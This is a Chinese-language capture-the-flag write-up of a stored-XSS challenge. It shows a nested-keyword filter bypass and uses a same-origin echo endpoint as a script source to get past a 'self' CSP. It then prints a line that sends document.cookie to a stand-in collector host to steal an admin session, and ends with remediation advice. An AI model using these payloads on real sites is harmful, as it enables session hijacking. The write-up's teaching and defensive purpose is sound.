# Cosmos 的聊天室2.0

## 题目简述

聊天室继续存在存储型 XSS，但服务端会删除一次字符串 `script`，响应还设置了 `Content-Security-Policy: default-src 'self'; script-src 'self'`。解法先用嵌套单词绕过一次性过滤，再把同源的 `/send` 接口变成外部脚本资源，从而同时满足 CSP。

## 解题过程

过滤逻辑等价于：

```php
$message = str_replace('script', '', $message);
```

它不会循环过滤。输入 `scriscriptpt` 后，内层 `script` 被删掉，剩余字符会重新拼成 `script`：

```html
<scriscriptpt>alert(1)</scriscriptpt>
```

服务端输出时就变成正常的 `<script>` 标签。不过 CSP 禁止内联脚本，所以 `alert(1)` 仍不会执行。继续观察 `/send?message=...`：该接口会把 `message` 作为响应正文返回，而且 URL 与聊天室同源。于是可以把它作为满足 `script-src 'self'` 的外部 JavaScript 文件：

```html
<scriscriptpt src="/send?message=alert(1)"></scriscriptpt>
```

浏览器最终解析到的是：

```html
<script src="/send?message=alert(1)"></script>
```

确认执行后，把 `alert` 换成 Cookie 回传逻辑。下面展示的是结构，提交前需对 `message` 参数整体做 URL 编码：

```javascript
document.location =
  'https://collector.example/?c=' + encodeURIComponent(document.cookie);
```

将包含上述脚本源的消息发送给管理员机器人；管理员打开聊天室后，同源 `/send` 返回的代码获准执行，并把 Cookie 带到接收端。用取得的管理员会话访问受限页面即可得到 flag。

## 方法总结

- 核心链路：一次性关键字删除可被嵌套字符串绕过，同源文本响应又被滥用为 CSP 允许的脚本资源。
- 关键认识：CSP 只约束资源来源，不会判断同源响应是否“本来就该是 JavaScript”；可控的同源响应会削弱策略。
- 修复方向：按输出上下文做 HTML 转义，禁止用户内容形成标签；同时为 `/send` 设置正确内容类型、`nosniff`，并使用 nonce/hash 型 CSP，而不是只依赖 `'self'`。
